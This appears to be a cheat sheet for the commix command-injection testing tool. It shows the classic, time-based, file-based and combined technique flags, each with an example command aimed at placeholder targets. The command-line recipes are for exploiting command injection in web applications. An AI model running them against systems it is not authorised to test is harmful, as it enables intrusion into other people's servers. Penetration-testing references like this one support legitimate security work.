Injection Technique Flags
$
python3 commix.py -u "..." --technique C # classic
Direct echo of output — fastest, most reliable
$
python3 commix.py -u "..." --technique T # time-based
Blind — infer via sleep delays (slow but stealthy)
$
python3 commix.py -u "..." --technique F # file-based
Blind — write output to web-readable file
$
python3 commix.py -u "..." --technique CT # combine classic+time
Technique Cards
C Classic (results-based) injection
Output is returned directly in the HTTP response. Fastest and most reliable. Works when the app echoes command output.
python3 commix.py -u "http://t.com/?ping=INJECT_HERE" --technique C -v 3
T Time-based blind injection
No visible output. Infers injection success by measuring response time (e.g., sleep 5). Use --time-sec to set delay.
python3 commix.py -u "http://t.com/?q=1" --technique T --time-sec 5
F File-based injection
Writes output to a temp file on the server, then reads it back via HTTP. Needs write permission + web-accessible path.
python3 commix.py -u "http://t.com/?q=1" --technique F --web-root "/var/www/html"
Semi-blind Hybrid approach
Commix auto-detects semi-blind conditions — when partial output is visible but not full. Let commix auto-choose by omitting --technique.
python3 commix.py -u "http://t.com/?q=1" --batch --flush-session
